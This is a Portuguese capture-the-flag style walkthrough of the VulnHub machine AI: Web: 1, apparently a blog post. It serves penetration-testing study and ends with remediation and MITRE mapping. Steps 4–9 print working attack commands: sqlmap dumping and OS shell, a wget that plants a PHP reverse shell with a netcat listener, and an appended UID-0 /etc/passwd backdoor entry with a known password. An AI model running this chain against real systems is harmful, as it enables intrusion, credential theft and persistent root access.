# VulnHub AI: Web: 1 — SQLi até Root via /etc/passwd com Escrita Global

Caramba, rapaziada!! Quem diria que um simples formulário de ID de usuário ia entregar a máquina inteira de bandeja? AI: Web: 1 é uma máquina web clássica para iniciantes que encadeia injeção SQL, OS shell via sqlmap, upload de arquivo e um `/etc/passwd` com permissão de escrita global para chegar ao root completo. Top demais como estudo, tá ligado? Esse é exatamente o tipo de VM que explica por que validação de entrada e permissões de arquivo existem.

Valeu ao autor por manter a superfície limpa e as dicas sutis o suficiente pra você ter que pensar de verdade.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Fácil / Iniciante |
| **VM Alvo** | AI: Web: 1 |
| **VM do Atacante** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/ai-web-1,353/ |
| **Técnicas** | Enumeração web, injeção SQL, OS shell via sqlmap, upload de reverse shell PHP, privesc via /etc/passwd com escrita global |
| **CVEs / CWEs** | CWE-89 (SQL Injection), CWE-434 (Upload sem restrição de tipo), CWE-732 (/etc/passwd com escrita global) |
| **Grupos APT** | FIN7 (SQLi para acesso inicial), APT41 (implantação de web shell), Lazarus Group (upload de arquivo para persistência) |

---

## Resumo do Ataque

```
[descoberta de host: netdiscover / nmap]
    |
    v
[nmap: 80/tcp HTTP Apache]
    |
    v
[robots.txt => /m3diNf0/ e /se3reTdir777/uploads/]
    |
    v
[dirb /m3diNf0/ => info.php => divulgação do document root]
    |
    v
[SQLi no formulário de ID de usuário em /se3reTdir777/]
    |
    v
[sqlmap: dump do banco aiweb1 => credenciais extraídas]
    |
    v
[sqlmap --os-shell => shell interativo como www-data]
    |
    v
[upload de reverse shell PHP => listener nc => shell www-data]
    |
    v
[LinEnum: /etc/passwd com escrita global]
    |
    v
[echo novo usuário root >> /etc/passwd => su raj]
    |
    v
[ROOT => /root/flag.txt]
```

---

## Metodologia

1. Descoberta de host e identificação do alvo na rede local
2. Varredura de portas e enumeração de serviços com Nmap
3. Enumeração web via `robots.txt` e brute-force de diretórios com dirb
4. Divulgação do caminho PHP via `info.php`
5. Identificação e exploração de injeção SQL com sqlmap
6. OS shell via `sqlmap --os-shell` usando a divulgação de caminho
7. Upload de reverse shell PHP e captura via netcat
8. Escalação de privilégios via `/etc/passwd` com escrita global
9. Captura da flag root

---

## Passo 1 — Identificando o Alvo

Começamos com a descoberta de host porque precisamos do IP do alvo antes de qualquer coisa. Numa rede de lab host-only ou bridged, o `netdiscover` ou `arp-scan` funciona muito bem pra encontrar hosts ativos rapidinho.

```bash
# Opção 1: arp-scan (rápido, recomendado para redes de lab locais)
arp-scan --localnet --ignoredups

# Opção 2: netdiscover
netdiscover -r 192.168.13.0/24
```

Alvo identificado: **192.168.13.131**

```bash
# Opcional: atualizar /etc/hosts por conveniência
echo "192.168.13.131  aiweb1.lab" >> /etc/hosts
```

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1590 Gather Victim Network Information

---

## Passo 2 — Reconhecimento e Varredura de Portas

Uma porta, um serviço. O Nmap também dispara scripts NSE que capturam o `robots.txt` automaticamente.

```bash
nmap -A -T4 -p- 192.168.13.131
```

Saída esperada:

```
80/tcp open  http  Apache httpd
|_http-robots.txt: 2 disallowed entries
| /m3diNf0/ /se3reTdir777/uploads/
```

Só a porta 80 aberta. O script `http-robots.txt` do Nmap já encontrou dois caminhos proibidos. Esse `robots.txt` foi feito pra esconder coisa de buscador, não de atacante. Ixi, erro clássico.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1046 Network Service Discovery

---

## Passo 3 — Enumeração Web e Divulgação de Caminho

O `robots.txt` nos deu duas pistas. Começamos com `/m3diNf0/` em busca de arquivos interessantes.

```bash
dirb http://192.168.13.131/m3diNf0/
```

Saída esperada:

```
+ http://192.168.13.131/m3diNf0/info.php (CODE:200|SIZE:...)
```

Acesse `/m3diNf0/info.php`. É uma página `phpinfo()` que divulga:

```
Document Root: /home/www/html/web1x443290o2sdf92213
```

Nossa. Agora temos o caminho completo do document root, que o sqlmap vai precisar mais tarde pra largar arquivos.

Acesse `http://192.168.13.131/se3reTdir777/` e você encontra um formulário de "User ID".

> **Nota do mundo real:** Exposição via `robots.txt` levou à divulgação de caminhos sensíveis em inúmeras avaliações reais. Atacantes parseiam o arquivo antes de qualquer outra coisa. Referência: OWASP Testing Guide OTG-INFO-001.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1083 File and Directory Discovery

---

## Passo 4 — Descoberta de Injeção SQL

Teste o formulário de User ID em `/se3reTdir777/` com probes clássicos de SQLi:

- Entrada `1` retorna: `First name: admin | Last name: admin` (resposta válida)
- Entrada `1'` causa um erro visível (exceção não tratada)
- Entrada `1 OR 1=1` retorna todos os registros

O parâmetro não é sanitizado. Hora de soltar o sqlmap, mano.

Capture a requisição POST com o Burp Suite e salve como `req.txt`:

```
POST /se3reTdir777/ HTTP/1.1
Host: 192.168.13.131
Content-Type: application/x-www-form-urlencoded

uid=1
```

> **O que é SQL Injection?** A entrada do usuário é concatenada diretamente numa query SQL sem sanitização. O atacante injeta sintaxe SQL para alterar a lógica da query, despejar dados ou, em algumas configurações, executar comandos no SO. Mapeia para OWASP A03:2021 Injection e CWE-89.

> **MITRE ATT&CK:** TA0001 Initial Access | T1190 Exploit Public-Facing Application

---

## Passo 5 — Dump do Banco com sqlmap

```bash
# Identificar bancos de dados
sqlmap -r req.txt --dbs --batch

# Despejar o banco aiweb1
sqlmap -r req.txt -D aiweb1 --dump-all --batch
```

Credenciais recuperadas:

| ID | Usuário | Senha |
|----|---------|-------|
| 1 | t00r | FakeUserPassw0rd |
| 2 | aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sa |
| 3 | u3er | N0tThisOneAls0 |

O sqlmap também confirma um caminho de upload em `/se3reTdir777/uploads/`.

> **MITRE ATT&CK:** TA0006 Credential Access | T1555 Credentials from Password Stores

---

## Passo 6 — OS Shell via sqlmap

Com o document root do `info.php`, informamos ao sqlmap exatamente onde largar o stager:

```bash
sqlmap -r req.txt -D aiweb1 --os-shell
```

Quando solicitado:
- Linguagem da aplicação web: **PHP**
- Confirmar divulgação de caminho: **yes**
- Caminho gravável: `/home/www/html/web1x443290o2sdf92213`

Um shell OS interativo cai como `www-data`. Vacilou!

```bash
# Verificar acesso
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

cat /etc/passwd
```

> **MITRE ATT&CK:** TA0002 Execution | T1059.004 Unix Shell

---

## Passo 7 — Upload de Reverse Shell PHP

O stager do sqlmap é útil, mas limitado. Vamos fazer upgrade para um reverse shell de verdade.

Edite `/usr/share/webshells/php/php-reverse-shell.php`:

```php
$ip = '192.168.13.132';   // seu IP de atacante
$port = 1234;
```

No shell OS do sqlmap, baixe o arquivo:

```bash
# No shell OS do sqlmap:
wget http://192.168.13.132:8000/php-reverse-shell.php \
  -O /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/rshell.php
```

Na máquina atacante: inicie o servidor HTTP e o listener:

```bash
# Servir o shell
python3 -m http.server 8000

# Capturar o reverse shell
nc -lvp 1234
```

Acione o shell:

```
http://192.168.13.131/se3reTdir777/uploads/rshell.php
```

Shell recebido como `www-data`. Estabilize:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

> **MITRE ATT&CK:** TA0002 Execution | T1505.003 Web Shell | TA0003 Persistence

---

## Passo 8 — Escalação de Privilégios via /etc/passwd com Escrita Global

Execute o LinEnum para enumerar configurações incorretas:

```bash
# No atacante: servir o LinEnum
python3 -m http.server 8000

# No alvo (shell www-data):
cd /tmp
wget http://192.168.13.132:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

O LinEnum reporta: `/etc/passwd` está com **escrita global** (`-rw-rw-rw-`). Pô, isso é uma falha crítica de configuração, véi.

> **O que é abuso do /etc/passwd?** Quando o `/etc/passwd` tem escrita liberada para usuários não-root, um atacante pode adicionar uma entrada de usuário com UID 0 (root), criando efetivamente uma conta root backdoor com senha conhecida. Mapeia para CWE-732.

Gere um hash de senha:

```bash
openssl passwd -1 -salt user3 pass123
# Saída: $1$user3$rAGRVf5p2jYTqtqOW5cPu/
```

Adicione o novo usuário root:

```bash
echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' >> /etc/passwd
```

> **MITRE ATT&CK:** TA0004 Privilege Escalation | T1548 Abuse Elevation Control Mechanism | T1136 Create Account

---

## Passo 9 — Root e Flag

```bash
su raj
# Senha: pass123

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat flag.txt
```

**(☞ﾟヮﾟ)☞ Root conquistado!! Bora rapaziada!!**

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|------|-------|---------------|----------------|
| Credenciais DB | `t00r:FakeUserPassw0rd` | Banco aiweb1 via sqlmap | Referência de login |
| Credenciais DB | `aiweb1pwn:MyEvilPass_f908sdaf9_sadfasf0sa` | Banco aiweb1 via sqlmap | Referência de login |
| Credenciais DB | `u3er:N0tThisOneAls0` | Banco aiweb1 via sqlmap | Referência de login |
| Usuário root injetado | `raj:pass123` | /etc/passwd (injetado) | su raj -> root |
| Flag Root | ver `/root/flag.txt` | `/root/flag.txt` | N/A |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|----------------|
| 1 | `robots.txt` divulgou caminhos sensíveis | Atacantes parseiam o `robots.txt` antes de qualquer outro passo de recon | Remova caminhos internos; use ACLs do servidor web no lugar |
| 2 | Entrada de User ID sem sanitização permitiu dump completo do banco via sqlmap | SQLi é o vetor #1 de vazamento de dados (OWASP A03) | Use queries parametrizadas e prepared statements sempre |
| 3 | Página `phpinfo()` expôs document root e configuração do servidor | Atacantes usam divulgação de caminho para largar web shells com precisão | Desabilite phpinfo em produção; restrinja por IP se necessário para diagnóstico |
| 4 | `/etc/passwd` com escrita global permitiu injeção de conta root | Essa falha comprometeria qualquer host Linux imediatamente | `chmod 644 /etc/passwd` e audite permissões de arquivo regularmente |
| 5 | Endpoint de upload sem validação de tipo | Web shells implantados via upload sem restrição são um dos principais vetores de acesso inicial | Valide tipo MIME, extensão e conteúdo; armazene uploads fora da web root |

**Por que isso importa fora do lab?**

Injeção SQL impulsionou alguns dos maiores vazamentos já registrados: Heartland Payment Systems (2008, 130 milhões de cartões), Sony Pictures (2011) e inúmeros vazamentos de dados na área de saúde. A combinação de SQLi com capacidade de escrita de arquivo mapeia diretamente para como o FIN7 e o Lazarus Group obtêm acesso inicial em ambientes de varejo e financeiros. A falha de `/etc/passwd` com escrita global, embora dramática num lab, tem análogos reais: imagens base de containers mal configuradas e buckets de armazenamento em nuvem com ACLs abertas levam a ataques equivalentes de injeção de credenciais todos os dias.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Network Service Discovery | T1046 |
| Reconhecimento | TA0043 | File and Directory Discovery | T1083 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application | T1190 |
| Execução | TA0002 | Unix Shell via OS Command Injection | T1059.004 |
| Execução | TA0002 | Web Shell | T1505.003 |
| Persistência | TA0003 | Create Account: Local Account | T1136.001 |
| Escalação de Privilégios | TA0004 | Abuse Elevation Control Mechanism | T1548 |
| Acesso a Credenciais | TA0006 | Credentials from Password Stores | T1555 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |
| Coleta | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Substitua toda concatenação de strings SQL por queries parametrizadas ou prepared statements no formulário de User ID.
2. Remova caminhos sensíveis do `robots.txt`; proteja-os com autenticação no servidor web ou allowlists de IP.
3. Desabilite ou remova páginas `phpinfo()` de produção; restrinja a IPs internos se diagnóstico for necessário.
4. Restaure as permissões do `/etc/passwd`: `chmod 644 /etc/passwd` e certifique-se que é `root:root`.
5. Implemente validação de upload de arquivo: verifique tipo MIME, allowlist de extensões, inspeção de conteúdo; armazene arquivos fora da web root.
6. Revogue o privilégio `FILE` do usuário MySQL da aplicação para evitar ataques com `INTO OUTFILE`.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Isole o servidor web da rede interna.
- Rotacione todas as credenciais do banco e audite os privilégios dos usuários do banco.
- Remova quaisquer web shells carregados e revise os logs de acesso do caminho de upload.
- Audite `/etc/passwd` e `/etc/shadow` em busca de contas não autorizadas.

**Contramedidas MITRE D3FEND:**
- D3-NI Network Isolation para o host web comprometido (T1190)
- D3-PA Process Allow Listing para bloquear execução de web shell (T1505.003)
- D3-FCA File Content Analysis para detectar arquivos PHP carregados (CWE-434)
- D3-UAP User Account Permissions: auditoria de arquivos críticos com escrita global (CWE-732)

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identify (ID.AM): Mantenha inventário dos ativos da aplicação web e seus estados de permissão.
- Protect (PR.DS-1): Proteção de dados em repouso; restrinja acesso de escrita a arquivos críticos do SO.
- Protect (PR.PT-3): Princípio do menor privilégio aplicado a usuários do banco e permissões de arquivo.
- Detect (DE.CM-1): Monitoramento contínuo para criação não autorizada de contas e mudanças em arquivos.
- Respond (RS.RP-1): Execute o plano de resposta a incidentes ao detectar atividade de web shell.

**NIST SP 800-53 Rev. 5:**
- SI-10: Information Input Validation (queries parametrizadas)
- AC-6: Least Privilege (privilégio FILE do banco, permissões de arquivo do SO)
- CM-7: Least Functionality (desabilitar phpinfo em produção)
- AU-12: Audit Record Generation (registrar todos os uploads e queries do banco)
- IA-5: Authenticator Management (credenciais fortes do banco)

**CISA Known Exploited Vulnerabilities:**
- Sem correspondência direta de CVE para esta aplicação customizada; no entanto, vulnerabilidades de SQL injection afetando frameworks populares estão no catálogo CISA KEV.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ASSET (Asset, Change, and Configuration Management)
- Prática: Manage IT and OT Asset Inventory
- MIL Alvo: MIL-2 (práticas gerenciadas e documentadas)

---

## Considerações Finais

Valeu ao autor do AI: Web: 1 por construir uma máquina que empacota cinco classes distintas de vulnerabilidade em um único serviço HTTP. Este é exatamente o tipo de lab que faz a ponte entre "saber o que é SQLi" e "encadear isso até o root".

A cadeia `robots.txt` para divulgação de caminho para OS shell via sqlmap é algo que você vai ver replicado em avaliações reais constantemente. E o `/etc/passwd` com escrita global é um lembrete de que higiene de permissões de arquivo no Linux não é opcional.

Se esse walkthrough te ajudou, compartilha com a galera e continua hackando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
